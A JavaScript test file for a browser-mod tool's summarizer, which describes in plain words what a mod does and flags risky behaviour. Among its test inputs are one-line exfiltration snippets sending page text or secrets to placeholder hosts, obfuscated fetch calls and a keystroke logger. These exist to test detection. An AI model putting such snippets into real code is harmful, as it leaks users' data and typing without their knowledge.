// core/summary.js: what a mod does, in plain words. One small example per
// category, plus the notes and the cases that must not cry wolf.
import { test } from "node:test";
import assert from "node:assert/strict";
import { summarizeMod, summaryLines, modOrigin, modHosts, whereRuns, SUMMARY_ITEMS, SUMMARY_NOTES } from "../core/summary.js";
import { modMatches } from "../core/mod.js";

const ids = mod => summarizeMod(mod).items.map(i => i.id);
const notes = mod => summarizeMod(mod).notes.map(n => n.id);
const js = code => ({ css: "", js: code });
const css = code => ({ css: code, js: "" });
const says = (mod, id, msg) => assert.ok(ids(mod).includes(id), `${msg || JSON.stringify(mod)} should mention ${id}; got ${ids(mod)}`);
const silent = (mod, id, msg) => assert.ok(!ids(mod).includes(id), `${msg || JSON.stringify(mod)} should not mention ${id}`);

test("every category has plain words and no jargon", () => {
  for (const i of SUMMARY_ITEMS) {
    assert.match(i.text, /^[A-Z][a-z' ,]+$/, i.id);
    assert.doesNotMatch(`${i.text} ${i.detail || ""}`, /\b(API|DOM|JS|CSS|XHR|fetch|HTTP|exfiltrat|payload)\b/i, i.id);
  }
  for (const n of Object.values(SUMMARY_NOTES)) assert.doesNotMatch(n, /\b(API|DOM|XHR|exfiltrat)\b/i);
});

test("looks: any CSS, or styling from code", () => {
  says(css("a { color: red }"), "looks");
  says(js("el.style.color = 'red'"), "looks");
  says(js("morse.css('.x{}')"), "looks");
  says(js("b.classList.add('big')"), "looks");
});

test("hides: display none, visibility, removing things", () => {
  says(css(".ad { display: none }"), "hides");
  says(css(".x { visibility:hidden }"), "hides");
  says(js("morse.watch('.ad', el => el.remove())"), "hides");
  says(js("x.hidden = true"), "hides");
  silent(css("a { opacity: 0.5 }"), "hides");
});

test("text: changing words on the page", () => {
  says(js("h1.textContent = 'Hello'"), "text");
  says(js("document.title = 'Inbox'"), "text");
  says(css("h1::after { content: ' (beta)' }"), "text");
  silent(css("h1::after { content: '' }"), "text");
});

test("buttons, and other new things", () => {
  const button = js("morse.watch('header', h => h.append(morse.el('button', { text: 'Copy' })))");
  says(button, "buttons");
  silent(button, "adds", "only buttons were added");
  says(js("document.createElement('button')"), "buttons");
  const div = js("document.body.append(morse.el('div', { text: 'Word count: 0' }))");
  says(div, "adds");
  silent(div, "buttons");
  says(js("x.insertAdjacentHTML('afterend', '<b>new</b>')"), "adds");
});

test("a mod's own things don't count as changing or hiding the page", () => {
  // The sleep timer removes and rewrites its own countdown label, nothing else.
  const sleep = js(`morse.watch(".btns", btns => {
  let left = 0;
  const label = morse.el("span");
  const btn = morse.el("button", { class: "morse-sleep", title: "Sleep timer", text: "☾", on: { click() { left = 900; render(); } } });
  const render = () => {
    btn.classList.toggle("on", left > 0);
    label.textContent = left ? Math.floor(left / 60) + ":" + String(left % 60).padStart(2, "0") : "";
    if (left) btn.append(label); else label.remove();
  };
  morse.every(1000, () => { if (left && --left === 0) document.querySelector("[data-testid=play-pause]").click(); render(); });
  btns.append(btn);
});`);
  silent(sleep, "hides", "the sleep timer only removes its own label");
  silent(sleep, "text", "the sleep timer only changes its own label");
  for (const id of ["looks", "buttons", "adds", "clicks", "acts", "ongoing", "code"]) says(sleep, id, `the sleep timer (${id})`);
  silent(js("const b = document.createElement('div'); b.innerHTML = '<b>Hi</b>'; document.body.append(b)"), "text");
  silent(js("const b = document.createElement('div'); document.body.append(b); b.hidden = true"), "hides");
  silent(js("let tip; tip = morse.el('div'); tip.textContent = 'Saved'; tip.remove()"), "text");
  silent(js("let tip; tip = morse.el('div'); tip.textContent = 'Saved'; tip.remove()"), "hides");
});

test("the page's own things still count, whatever the mod also made", () => {
  // A page element, next to one the mod made.
  says(js("const tag = morse.el('span'); tag.textContent = 'new'; document.querySelector('h1').textContent = 'Inbox'"), "text");
  says(js("const tag = morse.el('span'); tag.remove(); morse.watch('.ad', ad => ad.remove())"), "hides");
  // A name that is also used for a page element is never trusted.
  says(js("const el = morse.el('div'); el.remove(); morse.watch('.ad', el => el.remove())"), "hides", "a name reused as a callback parameter");
  says(js("let el = morse.el('div'); el = document.querySelector('h1'); el.textContent = 'x'"), "text", "a name reassigned to a page element");
  says(js("function f(label) { label.textContent = 'x' } const label = morse.el('i')"), "text", "a name that is also a parameter");
  // Chains and `this` can't be traced, so they count.
  says(js("const box = morse.el('div'); box.parentElement.remove()"), "hides");
  says(js("document.querySelector('.x').remove()"), "hides");
  says(js("morse.css('.ad { display: none }')"), "hides");
  says(js("h.style.display = 'none'"), "hides");
  says(js("this.textContent = 'x'"), "text");
});

test("the gallery's sleep timers and word count read plainly", async () => {
  const { readFile } = await import("node:fs/promises");
  const load = async f => JSON.parse(await readFile(new URL(`../site/mods/${f}.morse.json`, import.meta.url), "utf8"));
  for (const f of ["tunes-sleep-timer", "spotify-sleep-timer"]) {
    const mod = await load(f);
    silent(mod, "hides", f);
    silent(mod, "text", f);
    says(mod, "buttons", f);
    says(mod, "acts", f); // it does press Pause for you
  }
  silent(await load("chatgpt-word-count"), "text", "the word count only writes into its own badge");
});

test("clicks: reacting to the pointer", () => {
  says(js("morse.on(document, 'click', e => {})"), "clicks");
  says(js("morse.el('button', { on: { click: () => go() } })"), "clicks");
  says(js("window.addEventListener('scroll', f)"), "clicks");
  silent(js("addEventListener('keydown', f)"), "clicks");
  says(js("morse.on(document.querySelector('#send'), 'click', go)"), "clicks", "the event after a nested call");
  silent(js("morse.on(box, 'input', () => fetch('/x', { method: 'POST' }))"), "clicks", "a quoted word that isn't an event");
});

test("typing: reading what you type, with a note", () => {
  for (const code of [
    "morse.on(box, 'input', e => n = e.target.value.length)",
    "addEventListener('keydown', e => log.push(e.key))",
    "const t = document.querySelector('textarea').value",
    "morse.el('input', { on: { keyup() {} } })",
    "el.oninput = () => {}",
    "getSelection().toString()",
  ]) {
    says(js(code), "typing", code);
    assert.ok(notes(js(code)).includes("typing"), code);
  }
  silent(js("morse.on(b, 'click', go)"), "typing");
});

test("acts: clicking or submitting for you", () => {
  says(js("document.querySelector('.next').click()"), "acts");
  says(js("form.submit()"), "acts");
  says(js("el.dispatchEvent(new MouseEvent('click'))"), "acts");
});

test("ongoing: watchers and timers", () => {
  says(js("morse.watch('.x', f)"), "ongoing");
  says(js("morse.every(1000, tick)"), "ongoing");
  says(js("new MutationObserver(f).observe(document.body, {})"), "ongoing");
  silent(js("morse.after(10, f)"), "ongoing");
});

test("storage and cookies", () => {
  says(js("morse.store.set('on', true)"), "storage");
  says(js("localStorage.getItem('x')"), "storage");
  says(js("const c = document.cookie"), "cookies");
  silent(js("const c = document.cookie"), "storage");
});

test("clipboard", () => {
  says(js("navigator.clipboard.writeText(md)"), "clipboard");
  says(js("document.execCommand('copy')"), "clipboard");
});

test("navigates: opening or reloading pages", () => {
  says(js("window.open('https://example.com')"), "navigates");
  says(js("location.href = '/inbox'"), "navigates");
  says(js("location.reload()"), "navigates");
  silent(js("if (location.href === x) go()"), "navigates");
});

test("network: sending data elsewhere, always with a note", () => {
  for (const code of [
    "fetch('https://example.com/log', { method: 'POST', body: document.body.innerText })",
    "navigator.sendBeacon('https://t.example', data)",
    "new XMLHttpRequest()",
    "const ws = new WebSocket('wss://x')",
    "new Image().src = 'https://x.example/p?d=' + v",
    "img.src = url",
    "document.body.insertAdjacentHTML('beforeend', '<img src=https://x.example/a.gif>')",
    "morse.el('img', { src: 'https://x.example/p.png' })",
    "parent.postMessage(secret, '*')",
  ]) {
    says(js(code), "network", code);
    assert.ok(notes(js(code)).includes("network"), code);
  }
  says(css("body { background: url(https://x.example/p.png?u=1) }"), "network", "a CSS URL carrying data");
});

test("loads: files from another website, without crying network", () => {
  const m = css("@import url('https://fonts.example/inter.css'); body { background: url(//cdn.example/bg.png) }");
  says(m, "loads");
  silent(m, "network");
  silent(css("body { background: url(data:image/png;base64,AAAA) }"), "loads");
});

test("device and notifications", () => {
  says(js("navigator.mediaDevices.getUserMedia({ audio: true })"), "device");
  says(js("navigator.geolocation.getCurrentPosition(f)"), "device");
  says(js("new Notification('Done')"), "notify");
});

test("dynamic: code that builds code gets a note", () => {
  for (const code of [
    "eval(s)",
    "new Function('a', body)",
    "setTimeout('go()', 10)",
    "window['fe' + 'tch'](u)",
    "globalThis[atob('ZmV0Y2g=')](u)",
    "\\u0066etch('https://x')",
    "const s = document.createElement('script')",
    "String.fromCharCode(102, 101)",
  ]) {
    says(js(code), "dynamic", code);
    assert.ok(notes(js(code)).includes("dynamic"), code);
  }
  for (const code of ["function go() {}", "const f = function (x) { return x }", "morse.el('span', { text: 'Done \\u2713' })", "items[0].click"]) {
    silent(js(code), "dynamic", code);
  }
});

test("code: any JS says it runs code, a CSS-only mod doesn't", () => {
  says(js("1"), "code");
  silent(css("a{}"), "code");
});

test("a typical word-count mod reads plainly, in order", () => {
  const m = { css: ".wc { opacity: .7 }", js: "morse.watch('textarea', t => { const c = morse.el('div', { class: 'wc' }); t.after(c); morse.on(t, 'input', () => c.textContent = t.value.split(/\\s+/).length + ' words'); });" };
  // The counter's own words change, not the page's: no "Changes text on the page".
  assert.deepEqual(ids(m), ["looks", "adds", "typing", "ongoing", "code"]);
  assert.deepEqual(notes(m), ["typing"]);
  const lines = summaryLines(m);
  assert.equal(lines[0], "Changes how the page looks");
  assert.match(lines.at(-1), /^Note: This mod can read what you type/);
});

test("an empty mod says so", () => {
  assert.equal(summarizeMod({ css: " ", js: "" }).empty, true);
  assert.deepEqual(summaryLines({}), ["Doesn't change anything (it has no code)"]);
});

test("where it runs: the words follow the same rule as modMatches", () => {
  const url = "https://news.example/a", other = "https://mail.example/";
  for (const [match, words, hostsBack] of [
    [undefined, "every website", ["*"]],
    [{}, "every website", ["*"]],                // no host list means everywhere, not "this site"
    [{ hosts: ["*"] }, "every website", ["*"]],
    [{ hosts: ["news.example"] }, "news.example", ["news.example"]],
    [{ hosts: ["file"] }, "files on this computer", ["file"]],
    [{ hosts: [null] }, /nowhere/, null],
    [{ hosts: [1] }, /nowhere/, null],
    [{ hosts: [] }, /nowhere/, null],
    [{ hosts: "news.example" }, /nowhere/, null],
    ["news.example", /nowhere/, null],
    [{ hosts: ["x"], app: "spotify" }, "spotify", ["x"]],
  ]) {
    const mod = { match };
    assert.deepEqual(modHosts(mod), hostsBack, JSON.stringify(match));
    if (words instanceof RegExp) assert.match(whereRuns(mod), words); else assert.equal(whereRuns(mod), words);
    // What the words say is what happens.
    if (match?.app) continue;
    const runsElsewhere = modMatches(mod, { url: other, app: null });
    assert.equal(runsElsewhere, whereRuns(mod) === "every website", `${JSON.stringify(match)} on another site`);
    assert.equal(modMatches(mod, { url, app: null }), !!hostsBack && (hostsBack.includes("*") || hostsBack.includes("news.example")), `${JSON.stringify(match)} here`);
  }
});

test("where it came from, in a few words", () => {
  assert.match(modOrigin({ imported: true, importedFrom: "link", importedAt: "2026-10-01T10:00:00Z", author: "Ana" }), /^Installed from a shared link by Ana on /);
  assert.match(modOrigin({ imported: true, importedFrom: "backup" }), /^Restored from a backup/);
  assert.match(modOrigin({ imported: true, importedFrom: "file" }), /^Imported from a file/);
  assert.equal(modOrigin({ imported: true }), "Installed from a shared link");
  assert.equal(modOrigin({ from: { app: "Spotify" } }), "Rebuilt from something in Spotify");
  assert.match(modOrigin({ kind: "manual" }), /^Your own edits/);
  assert.match(modOrigin({ model: "Claude Code · haiku", created: "2026-10-01T10:00:00Z" }), /^Made here with Claude Code · haiku, /);
});
